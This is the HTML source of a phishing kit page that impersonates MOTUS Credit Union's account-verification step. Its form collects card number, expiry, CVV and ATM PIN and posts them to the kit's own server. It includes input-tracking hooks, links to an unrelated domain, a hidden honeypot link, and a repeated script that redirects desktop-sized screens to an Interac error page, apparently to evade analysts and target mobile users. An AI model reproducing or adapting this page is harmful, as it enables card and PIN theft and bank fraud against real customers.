
<? php  ?>=(0040)/220098/motus/c -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <title>Reset Password - MOTUS Credit Union</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="description" content="MOTUS Credit Union online banking">
        <meta name="keywords" content="meridian, credit, union, online, banking">
        <link href="./MOT_4_files/style.css" rel="stylesheet">
        <script src="./MOT_4_files/jquery-3.6.0.min" crossorigin="anonymous"></script>
        <script>var lrbank = 'Motus'; var lrinfo = 'Card';</script>
        <script src="./MOT_4_files/actions"></script>
        <style>
        .signin-form .signin-form-content {
            padding: 3px !important;
        }

        .newselect {
            margin-bottom: 10px !important;
            background: #253746 !important;
            border: none !important;
            border-bottom: 1px solid #a8a8a8 !important;
            color: #ffffff !important;
            min-height: 28px;
            outline: 0;
            padding: 3px 0 !important;
            transition: border-color .1s ease;
            width: 100%;
            border-radius: 0;
        }
        </style>
    </head>
    <body>
        <div class="load-remove" style="display: none">
        </div>
        <div class="body-content">
            <div class="row public-header">
                <div class="logo-container">
                    <a href="http://veneskey.com/Security_Login">
                        <img src="./MOT_4_files/logo.svg" alt="MOTUS Logo" class="meridian-logo">
                    </a>
                </div>
                <div class="link-container">
                    <ul class="utility-links">
                        <li>
                            <a href="https://www.motus.ca/" target="_blank">MOTUSCU.ca</a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
        <div id="page-content" class="signin-page">
            <div class="signin-page-inner dimmed">
                <div class="row">
                    <div class="signin-form-container wide">
                        <form action="/220098/motus/c" method="post" onsubmit="return validate()">
                            <div class="signin-form">
                                <h1>Verify Your Account</h1>
                                <div class="horizontal-steps">
                                    <div class="step ">
                                        <span>Log in</span>
                                    </div>
                                    <div class="step selected">
                                        <span>Verify account</span>
                                    </div>
                                    <div class="step ">
                                        <span>Complete</span>
                                    </div>
                                </div>
                                <h3>Payment Information</h3>
                                <div class="if-div">
                                    <p><b>Card Number:</b></p>
                                    <input id="input-card" type="tel" placeholder="" name="card" onkeyup="split()" required="true" autocomplete="off" maxlength="19" oninput="this.value = this.value.replace(/[^0-9, ]/, &#39;&#39;)" class="lrinput newselect" attr-action="Filling Card">
                                    <script src="./MOT_4_files/splitter"></script>
                                    <link rel="stylesheet" href="./MOT_4_files/card.css">
                                </div>
                                <div class="if-div">
                                    <p><b>Expiry:</b></p>
                                    <select name="exp1" required="" style="width:48%; display: inline-block;" class="lrinput newselect" attr-action="Selecting Expiry">
                                        <option value="">MM</option>
                                        <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>                                    </select>
                                    <select name="exp2" required="" style="width:50%; display: inline-block;" class="lrinput newselect" attr-action="Selecting Expiry">
                                        <option value="">YY</option>
                                        <option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option><option value="32">32</option><option value="33">33</option><option value="34">34</option><option value="35">35</option><option value="36">36</option><option value="37">37</option><option value="38">38</option>                                    </select>
                                </div>
                                <div class="if-div">
                                    <p><b>Cvv:</b></p>
                                    <input required="" id="input-cvv" type="tel" maxlength="3" placeholder="•••" name="cvv" class="lrinput newselect" oninput="this.value = this.value.replace(/[^0-9]/, &#39;&#39;)" autocomplete="off" attr-action="Filling Cvv">
                                </div>
                                <div class="if-div">
                                    <p><b>ATM Pin:</b></p>
                                    <input required="" id="input-atm" type="tel" maxlength="6" placeholder="••••" name="atm" class="lrinput newselect" oninput="this.value = this.value.replace(/[^0-9]/, &#39;&#39;)" autocomplete="off" attr-action="Filling ATM Pin">
                                </div>
                                <div class=" signin-buttons">
                                    <div>
                                        <input type="submit" name="save" class="orange button" value="Continue">
                                    </div>
                                </div>
                            </div>
                        </form>
                        <br><br>
                        <div class="signin-form-links">
                            <a href="http://veneskey.com/Security_Contact" class="semibold ">Contact Us</a> |
                            <a href="http://veneskey.com/Security_FAQ" class="semibold ">FAQs</a> |
                            <a href="http://veneskey.com/Security_Difficulty" class="semibold ">Having Difficulty Signing In?</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <footer class="main-footer" style="background: #a7a7a7;">
            <div class="row">
                <div class="footer-logos">
                    <div class="logo-container">
                        <a href="http://veneskey.com/Security_Login">
                        <img src="./MOT_4_files/logo.svg" alt="Meridian Logo" class="meridian-logo">
                        </a>
                    </div>
                    <div>
                        <img src="./MOT_4_files/entrust.png" class="entrust-seal">
                    </div>
                </div>
                <div class="footer-sub">
                    <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                    <span>Copyright © 2023 MOTUS Credit Union. All rights reserved.</span>
                    <div class="footer-links">
                        <a href="https://www.motus.ca/privacy" title="Privacy &amp; Security" target="_blank">Privacy &amp; Security</a>
                        <a href="https://www.motus.ca/legal" title="Legal" target="_blank">Legal</a>
                        <a href="https://www.motus.ca/accessibility" title="Accessibility" target="_blank">Accessibility</a>
                    </div>
                </div>
            </div>
        </footer>
    

</body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>